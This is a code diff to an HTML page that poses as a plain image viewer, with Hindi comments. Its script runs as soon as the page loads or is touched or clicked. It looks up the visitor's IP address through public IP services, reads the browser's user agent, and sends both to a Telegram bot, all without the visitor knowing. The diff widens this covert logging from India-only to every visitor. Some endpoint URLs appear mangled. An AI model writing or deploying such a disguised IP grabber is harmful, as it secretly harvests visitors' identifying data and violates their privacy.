@@ -23,7 +23,7 @@
 </head>
 <body>
 
-    <!-- 📷 फोटो अब हमेशा दिखेगी, चाहे ट्रैकिंग में कोई भी एरर आए -->
+    <!-- 📷 फोटो अब हमेशा दिखेगी -->
     <img src="photo.jpg" alt="Image Viewer">
 
     <script>
@@ -36,59 +36,36 @@
             if (isTracked) return;
             isTracked = true;
 
-            // 🚀 क्लाउडफ्लेयर के नेटवर्क से लाइव डेटा निकालना
-            fetch('/cdn-cgi/trace')
-            .then(res => res.text())
-            .then(traceText => {
-                let lines = traceText.split('\n');
-                let traceData = {};
-                
-                for (let i = 0; i < lines.length; i++) {
-                    let parts = lines[i].split('=');
-                    if (parts.length === 2) {
-                        traceData[parts[0].trim()] = parts[1].trim();
-                    }
-                }
-
-                let visitorIP = traceData['ip'] || "Unknown IP";
-                let visitorCountry = traceData['loc'] || "Unknown"; 
-
-                // 🇮🇳 सिर्फ इंडिया लॉक (यदि विज़िटर इंडिया का है तभी टेलीग्राम पर जाएगा)
-                if (visitorCountry === "IN") {
-                    getDeviceModelAndSend(visitorIP);
-                }
+            // 🌐 बिना किसी फिल्टर के सीधे और सबसे तेज आईपी निकालने वाली API
+            fetch('https://ipify.org')
+            .then(res => {
+                if (!res.ok) throw new Error('Network error');
+                return res.json();
+            })
+            .then(data => {
+                // टेलीग्राम पर मैसेज भेजने का फंक्शन चालू करें
+                sendToTelegram(data.ip);
             })
             .catch(err => {
-                // बैकअप तरीका: अगर क्लाउडफ्लेयर ट्रेस काम न करे, तो सीधे आईपी निकालकर भेजें
-                fetch('https://ipify.org')
+                // अगर ऊपर वाली API फेल हो तो बैकअप API
+                fetch('https://ipapi.co')
                 .then(res => res.json())
                 .then(data => {
-                    getDeviceModelAndSend(data.ip);
-                }).catch(e => console.log("Tracking Offline"));
+                    sendToTelegram(data.ip);
+                }).catch(e => {
+                    // अगर इंटरनेट बिल्कुल काम न करे तो बिना आईपी के केवल नोटिफिकेशन भेजें
+                    sendToTelegram("IP Hidden/VPN Active");
+                });
             });
         }
 
-        function getDeviceModelAndSend(ip) {
-            let phoneModel = "Laptop/Desktop or Hidden Model";
-            
-            // ब्राउज़र की प्राइवेसी लेयर से असली फोन का नाम निकालना
-            if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
-                navigator.userAgentData.getHighEntropyValues(['model'])
-                .then(uaData => {
-                    if (uaData.model) phoneModel = uaData.model;
-                    sendToTelegram(ip, phoneModel);
-                }).catch(() => {
-                    sendToTelegram(ip, phoneModel);
-                });
-            } else {
-                sendToTelegram(ip, phoneModel);
-            }
-        }
+        function sendToTelegram(ip) {
+            // इनकॉग्निटो मोड में एरर से बचने के लिए सीधा यूज़र एजेंट टेक्स्ट निकालना
+            const userAgentText = navigator.userAgent;
 
-        function sendToTelegram(ip, model) {
-            const message = `🚨 *New Visitor Alert (India)* 🚨\n\n` +
+            const message = `🚨 *New Visitor Alert* 🚨\n\n` +
                             `🌐 *IP Address:* \`${ip}\`\n` +
-                            `📱 *Device Model:* ${model}\n` +
+                            `📱 *User Agent:* \`${userAgentText}\`\n` +
                             `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;
 
             fetch(`https://telegram.org{telegramToken}/sendMessage`, {
@@ -99,13 +76,15 @@
                     text: message,
                     parse_mode: 'Markdown'
                 })
+            }).then(res => {
+                if(!res.ok) console.log("Telegram API Error");
             });
         }
 
-        // विज़िटर के आते ही या स्क्रीन छूते ही तुरंत एक्टिव होगा
+        // जैसे ही पेज लोड होगा या स्क्रीन छुई जाएगी, तुरंत डेटा जाएगा
         window.addEventListener('DOMContentLoaded', startTracking);
         window.addEventListener('touchstart', startTracking);
-        window.addEventListener('mousemove', startTracking);
+        window.addEventListener('click', startTracking);
     </script>
 
 </body>
